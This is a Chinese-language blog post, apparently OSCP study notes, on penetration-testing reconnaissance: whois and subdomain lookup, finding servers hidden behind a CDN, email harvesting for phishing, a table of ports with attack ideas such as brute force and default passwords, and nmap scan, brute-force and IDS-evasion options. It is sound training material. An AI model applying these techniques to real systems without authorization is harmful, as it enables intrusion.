<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>渗透框架 - panic</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="panic"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="panic"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="OSCP Guide"><meta property="og:type" content="blog"><meta property="og:title" content="渗透框架"><meta property="og:url" content="http://example.com/2020/04/20/pentest/"><meta property="og:site_name" content="panic"><meta property="og:description" content="OSCP Guide"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2020-04-20T07:16:02.000Z"><meta property="article:modified_time" content="2022-09-19T02:51:59.760Z"><meta property="article:author" content="lll"><meta property="article:tag" content="pentest"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/04/20/pentest/"},"headline":"渗透框架","image":["http://example.com/img/og_image.png"],"datePublished":"2020-04-20T07:16:02.000Z","dateModified":"2022-09-19T02:51:59.760Z","author":{"@type":"Person","name":"lll"},"publisher":{"@type":"Organization","name":"panic","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"OSCP Guide"}</script><link rel="canonical" href="http://example.com/2020/04/20/pentest/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="panic" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/readings">Readings</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-04-20T07:16:02.000Z" title="2020/4/20 下午3:16:02">2020-04-20</time>发表</span><span class="level-item"><time dateTime="2022-09-19T02:51:59.760Z" title="2022/9/19 上午10:51:59">2022-09-19</time>更新</span><span class="level-item">25 分钟读完 (大约3731个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">渗透框架</h1><div class="content"><p><a target="_blank" rel="noopener" href="https://sushant747.gitbooks.io/total-oscp-guide">OSCP Guide</a></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="whois-信息"><a href="#whois-信息" class="headerlink" title="whois 信息"></a>whois 信息</h3><p>获取注册人信息，包括注册邮箱、注册公司、管理员邮箱、管理员联系电话，可以社工，还可以查询同一注册人注册的其他域名，域名对应的NS记录、MX记录，自动识别国内常见托管商</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//i</span>pwhois.cnnic.net.cn/</span><br><span class="line">http:<span class="regexp">//</span>whois.chinaz.com</span><br><span class="line">https:<span class="regexp">//</span>x.threatbook.cn/</span><br><span class="line">https:<span class="regexp">//</span>who.is/</span><br><span class="line">https:<span class="regexp">//</span>whois.aizhan.com/</span><br><span class="line">Linux whois 命令</span><br></pre></td></tr></table></figure>

<p>站长之家和微步支持反查，另外两个中文显示有乱码</p>
<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><ol>
<li><p>爆破，</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wydomain,</span><br><span class="line">sublist3r</span><br><span class="line">layer 子域名挖掘机（支持端口扫描和探测服务器类型）</span><br><span class="line">https:<span class="regexp">//</span>phpinfo.me/domain</span><br><span class="line">subDomainsBrute</span><br></pre></td></tr></table></figure></li>
<li><p>google hack，搜索 <code>site:example.com</code>，也可以使用其他搜索引擎</p>
</li>
<li></li>
</ol>
<p>dns解析记录、爬虫、ssl证书、dns历史解析等等</p>
<h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><p>分为 IPC 备案信息和公安部备案信息，只有国内服务器需要备案。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.beianbeian.com/</span><br><span class="line">http:<span class="regexp">//</span>www.gsxt.gov.cn/index.html </span><br></pre></td></tr></table></figure>

<h3 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h3><p>天眼查、启信宝</p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><ol>
<li>Nslookup，Windows 命令：</li>
</ol>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nslookup</span> baidu.com</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>host,dig , Linux 命令：</li>
</ol>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host <span class="number">360</span>.<span class="keyword">cn</span></span><br><span class="line"><span class="keyword">dig</span> <span class="number">360</span>.<span class="keyword">cn</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>多地ping，网站：</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>asm.ca.com<span class="regexp">/en/</span>ping.php/</span><br><span class="line">http:<span class="regexp">//</span>ping.chinaz.com/</span><br><span class="line">https:<span class="regexp">//</span>ping.aizhan.com/</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>使用工具查询</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.cdnplanet.com<span class="regexp">/tools/</span>cdnfinder/</span><br><span class="line">https:<span class="regexp">//</span>www.ipip.net/ip.html</span><br><span class="line">http:<span class="regexp">//</span>tool.chinaz.com<span class="regexp">/dns/</span></span><br><span class="line">https:<span class="regexp">//</span>tool.lu<span class="regexp">/dns/</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol>
<li>子域名入手，有些子域名没有使用 cdn</li>
<li>利用网站漏洞，比如 phpinfo 信息泄露， Apache status 和 Jboss statu 泄露，源代码泄露， svn信息泄露， github 信息泄露</li>
<li>历史dns记录，查询网站：</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>dnsdb.io<span class="regexp">/zh-cn/</span></span><br><span class="line">https:<span class="regexp">//</span>x.threatbook.cn/</span><br><span class="line">http:<span class="regexp">//</span>toolbar.netcraft.com/site_report?url=</span><br><span class="line">http:<span class="regexp">//</span>viewdns.info/</span><br><span class="line">http:<span class="regexp">//</span>www.<span class="number">17</span>ce.com/</span><br><span class="line">https:<span class="regexp">//</span>sitereport.netcraft.com/</span><br><span class="line">https:<span class="regexp">//</span>community.riskiq.com/</span><br><span class="line">http:<span class="regexp">//</span>www.crimeflare.com/cfssl.html</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>CDN 本身入手，比如利用社工获得控制面板的账号密码</li>
<li>Mx记录或邮件，很多站点有发送邮件的功能，比如 rss 订阅，邮件系统一般在内部，没有经过CDN，邮件源码中可能包含服务器真实 IP</li>
<li>国外请求，国内CDN有时不会覆盖国外，可以通过国外代理访问得到真实 IP</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>asm.ca.com<span class="regexp">/en/</span>ping.php</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>扫描探测，通过信息收集，缩小扫描范围，确定一个较小的 IP 和端口范围，通过 http 指纹特征和 keyword 等综合判断</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zmap/</span>zgrab/</span><br><span class="line">http:<span class="regexp">//</span>www.ipdeny.com<span class="regexp">/ipblocks/</span></span><br></pre></td></tr></table></figure>

<ol start="8">
<li>Zmap，参考 <a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/211.html">安全客 - 简单获取 CDN 背后的真实IP</a></li>
<li>网络空间引擎搜索，zoomeye fofa shodan，获得历史快照，获取特征，例如：特有的 HTTP 头（server类型，版本，cookie等信息）、特定keyword（title, css, js, url等）、特定IP段搜索（fofa支持C段搜索）</li>
<li>查询 HTTPS 证书，</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>censys.io/</span><br></pre></td></tr></table></figure>

<p>这个网站会将所有 IP 进行扫描和连接，以及证书探测，如果目标站点有 https 证书，而且默认虚拟主机配了https证书，就可以找所有目标站点是改https证书的站点。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">443</span><span class="selector-class">.https</span><span class="selector-class">.tls</span><span class="selector-class">.certificate</span><span class="selector-class">.parsed</span><span class="selector-class">.extensions</span><span class="selector-class">.subject_alt_name</span><span class="selector-class">.dns_names</span>:www<span class="selector-class">.xxx</span>.com</span><br></pre></td></tr></table></figure>

<ol start="11">
<li>F5 LTM 负载均衡解码获取真实内网IP，<a href="https://link.zhihu.com/?target=https://threathunter.org/topic/5940c85d9c58e020408a79fe">透过F5获取服务器真实内网IP - ThreatHunter</a></li>
</ol>
<h3 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h3><p>查询与目标网站在同一台服务器上的网站</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>tool.lu<span class="regexp">/dns/</span></span><br></pre></td></tr></table></figure>

<h3 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h3><p>查询与目标服务器IP在同一C段的服务器</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">北极熊扫描器</span><br><span class="line">Nmap <span class="string">/24</span></span><br></pre></td></tr></table></figure>

<h3 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h3><p>首先确定目标邮件服务器所在的真实位置，看看邮件服务器有没有什么错误配置，比如没有禁用VREY或者EXPN命令导致用户信息泄露。然后从 whois 中获得域名的注册人，管理员邮箱，利用该搜索引擎和社工库等查看有没有泄露密码。或者从目标站点上搜集邮箱，比如网站上的联系我们，可以用于钓鱼。工具：theharvester</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>开始时可以使用 telnet 简单检查端口是否开放，防止使用扫描器被封IP。可以用 nmap, masscan进行扫描，常见端口以及渗透方法：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">端口号</span>	   <span class="string">端口服务/协议简要说明</span>	       <span class="string">关于端口可能的一些渗透用途</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">20</span><span class="string">,21</span>    <span class="string">ftp</span> <span class="string">默认的数据和命令传输端口[可明文亦可加密传输]</span>  <span class="string">允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd</span> <span class="number">1.3</span><span class="number">.5</span><span class="string">),各类后门(proftpd,vsftp</span> <span class="number">2.3</span><span class="number">.4</span><span class="string">)</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">22</span>	<span class="string">ssh[数据ssl加密传输]</span>	<span class="string">可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">23</span>	<span class="string">telnet[明文传输]</span>	<span class="string">爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">25</span>	<span class="string">smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</span>	<span class="string">邮件伪造,vrfy/expn</span> <span class="string">查询邮件用户信息,可使用smtp-user-enum工具来自动跑</span></span><br><span class="line"><span class="string">tcp/udp</span> <span class="number">53</span>	<span class="string">dns[域名解析]</span>	<span class="string">允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</span></span><br><span class="line"><span class="string">tcp/udp</span> <span class="number">69</span>	<span class="string">tftp[简单文件传输协议,无认证]</span>	<span class="string">尝试下载目标及其的各类重要配置文件</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">80</span><span class="number">-89</span><span class="string">,443,8440-8450,8080-8089</span>	<span class="string">web[各种常用的web服务端口]</span>	<span class="string">各种常用web服务端口,可尝试经典的top</span> <span class="string">n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">110</span>	[<span class="string">邮局协议</span>,<span class="string">可明文可密文</span>]	<span class="string">可尝试爆破,嗅探</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">137</span><span class="string">,139,445</span>	<span class="string">samba[smb实现windows和linux间文件共享,明文]</span>	<span class="string">可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">143</span>	<span class="string">imap[可明文可密文]</span>	<span class="string">可尝试爆破</span></span><br><span class="line"><span class="string">udp</span> <span class="number">161</span>	<span class="string">snmp[明文]</span>	<span class="string">爆破默认团队字符串,搜集目标内网信息</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">389</span>	<span class="string">ldap[轻量级目录访问协议]</span>	<span class="string">ldap注入,允许匿名访问,弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">512</span><span class="string">,513,514</span>	<span class="string">linux</span> <span class="string">rexec</span>	<span class="string">可爆破,rlogin登陆</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">873</span>	<span class="string">rsync备份服务</span>	<span class="string">匿名访问,文件上传</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1194	</span><span class="string">openvpn</span>	<span class="string">想办法钓vpn账号,进内网</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1352	</span><span class="string">Lotus</span> <span class="string">domino邮件服务</span>	<span class="string">弱口令,信息泄漏,爆破</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1433	</span><span class="string">mssql数据库</span>	<span class="string">注入,提权,sa弱口令,爆破</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1521	</span><span class="string">oracle数据库</span>	<span class="string">tns爆破,注入,弹shell…</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1500	</span><span class="string">ispmanager</span> <span class="string">主机控制面板</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1025</span><span class="string">,111,2049</span>	<span class="string">nfs</span>	<span class="string">权限配置不当</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">1723	</span><span class="string">pptp</span>	<span class="string">爆破,想办法钓vpn账号,进内网</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">2082</span><span class="string">,2083</span>	<span class="string">cpanel主机管理面板登录</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">2181	</span><span class="string">zookeeper</span>	<span class="string">未授权访问</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">2601</span><span class="string">,2604</span>	<span class="string">zebra路由</span>	<span class="string">默认密码zerbra</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">3128	</span><span class="string">squid代理服务</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">3312</span><span class="string">,3311</span>	<span class="string">kangle主机管理登录</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">3306	</span><span class="string">mysql数据库</span>	<span class="string">注入,提权,爆破</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">3389	</span><span class="string">windows</span> <span class="string">rdp远程桌面</span>	<span class="string">shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">4848	</span><span class="string">glassfish控制台</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">4899	</span><span class="string">radmin远程桌面管理工具,现在已经非常非常少了</span>	<span class="string">抓密码拓展机器</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">5000	</span><span class="string">sybase/DB2数据库</span>	<span class="string">爆破,注入</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">5432	</span><span class="string">postgresql数据库</span>	<span class="string">爆破,注入,弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">5632	</span><span class="string">pcanywhere远程桌面管理工具</span>	<span class="string">抓密码,代码执行,已经快退出历史舞台了</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">5900</span><span class="string">,5901,5902</span>	<span class="string">vnc远程桌面管理工具</span>	<span class="string">弱口令爆破,如果信息搜集不到位,成功几率很小</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">5984	</span><span class="string">CouchDB</span>	<span class="string">未授权导致的任意指令执行</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">6379	</span><span class="string">redis未授权</span>	<span class="string">可尝试未授权访问,弱口令爆破</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">7001</span><span class="string">,7002</span>	<span class="string">weblogic控制台</span>	<span class="string">java反序列化,弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">7778	</span><span class="string">kloxo</span>	<span class="string">主机面板登录</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">8000	</span><span class="string">Ajenti主机控制面板</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">8443	</span><span class="string">plesk主机控制面板</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">8069	</span><span class="string">zabbix</span>	<span class="string">远程执行,sql注入</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">8080</span><span class="number">-8089</span>	<span class="string">Jenkins,jboss</span>	<span class="string">反序列化,控制台弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">9080</span><span class="number">-9081</span><span class="string">,9090</span>	<span class="string">websphere控制台</span>	<span class="string">java反序列化/弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">9200</span><span class="string">,9300</span>	<span class="string">elasticsearch</span>	<span class="string">远程执行</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">10000</span>	<span class="string">webmin</span> <span class="string">linux主机web控制面板入口</span>	<span class="string">弱口令</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">11211</span>	<span class="string">memcached</span>	<span class="string">未授权访问</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">27017</span><span class="string">,27018</span>	<span class="string">mongodb</span>	<span class="string">爆破,未授权访问</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">3690	</span><span class="string">svn服务</span>	<span class="string">svn泄露,未授权访问</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">50000</span>	<span class="string">SAP</span> <span class="string">Management</span> <span class="string">Console</span>	<span class="string">远程执行</span></span><br><span class="line"><span class="string">tcp</span> <span class="number">50070</span><span class="string">,50030</span>	<span class="string">hadoop</span>	<span class="string">默认端口未授权访问</span></span><br></pre></td></tr></table></figure>

<p>nmap 常用选项：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描选项</span></span><br><span class="line"></span><br><span class="line">-sP			# 只扫描在线情况</span><br><span class="line">-sS			# SYN 扫描</span><br><span class="line">-sT			# TCP 扫描</span><br><span class="line">-sU			# UDP 扫描</span><br><span class="line">-sV			# 服务版本检测</span><br><span class="line">-O			# 操作系统识别</span><br><span class="line">--scanflags	# 指定 TCP 标志位，包括 URG, ACK, PSH, RST, SYN, FIN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时序选项</span></span><br><span class="line"></span><br><span class="line">-T0  偏执的：非常非常慢，用于IDS逃逸</span><br><span class="line">-T1  猥琐的：相当慢，用于IDS逃逸</span><br><span class="line">-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</span><br><span class="line">-T3  普通的：默认，根据目标的反应自动调整时间模式</span><br><span class="line">-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</span><br><span class="line">-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本</span></span><br><span class="line"></span><br><span class="line">-sC          等价于–<span class="attribute">script</span>=default，使用默认类别的脚本进行扫描 可更换其他类别 </span><br><span class="line">–<span class="attribute">script</span>=&lt;Lua scripts&gt;               &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述</span><br><span class="line">–<span class="attribute">script-args</span>=&lt;n1=v1,[<span class="attribute">n2</span>=v2,...]&gt;    为脚本提供默认参数</span><br><span class="line">–<span class="attribute">script-args-file</span>=filename          使用文件来为脚本提供参数</span><br><span class="line">–script-trace                       显示脚本执行过程中发送与接收的数据</span><br><span class="line">–script-updatedb                    更新脚本数据库</span><br><span class="line">–<span class="attribute">script-help</span>=&lt;scripts&gt;              显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本分类</span></span><br><span class="line"></span><br><span class="line">auth          负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本</span><br><span class="line">broadcast     在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</span><br><span class="line">brute         提供暴力破解方式，针对常见的应用如http/snmp等<span class="built_in"></span></span><br><span class="line"><span class="built_in">default </span>      使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<span class="built_in"></span></span><br><span class="line"><span class="built_in">discovery </span>    对网络进行更多的信息，如SMB枚举、SNMP查询等</span><br><span class="line">dos           用于进行拒绝服务攻击</span><br><span class="line">exploit       利用已知的漏洞入侵系统</span><br><span class="line">external      利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">fuzzer        模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</span><br><span class="line">malware       探测目标机是否感染了病毒、开启了后门等信息</span><br><span class="line">safe          此类与intrusive相反，属于安全性脚本</span><br><span class="line">version       负责增强服务与版本扫描（Version Detection）功能的脚本</span><br><span class="line">vuln          负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br><span class="line"></span><br><span class="line">按脚本分类扫描</span><br><span class="line"></span><br><span class="line"><span class="comment"># 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span></span><br><span class="line">nmap <span class="attribute">--script</span>=auth 192.168.137.*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</span></span><br><span class="line">nmap <span class="attribute">--script</span>=brute 192.168.137.*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span></span><br><span class="line">nmap <span class="attribute">--script</span>=default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否存在常见漏洞</span></span><br><span class="line">nmap <span class="attribute">--script</span>=vuln 192.168.137.*   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 在局域网内探查更多服务开启状况</span></span><br><span class="line">nmap -n -p445 <span class="attribute">--script</span>=broadcast 192.168.137.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用第三方的数据库或资源，例如进行whois解析</span></span><br><span class="line">nmap --script external 202.103.243.110</span><br></pre></td></tr></table></figure>

<h3 id="服务器和中间件信息"><a href="#服务器和中间件信息" class="headerlink" title="服务器和中间件信息"></a>服务器和中间件信息</h3><p>通过 nmap, zmap 等端口和指纹识别功能搜集，也可以使用 nc 和 telnet 进行 banner信息识别，常用工具 whatweb, <a target="_blank" rel="noopener" href="http://www.yunsee.cn/">www.yunsee.cn</a> , wappalyzer</p>
<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>WAF识别一般基于 header 信息，工具：waf00f，whatwaf，nmap</p>
<p>nmap 脚本：http-waf-detect, http-waf-fingerprint</p>
<h3 id="敏感文件、目录扫描"><a href="#敏感文件、目录扫描" class="headerlink" title="敏感文件、目录扫描"></a>敏感文件、目录扫描</h3><ol>
<li>御剑，dirsearch，dirb，dirbuster</li>
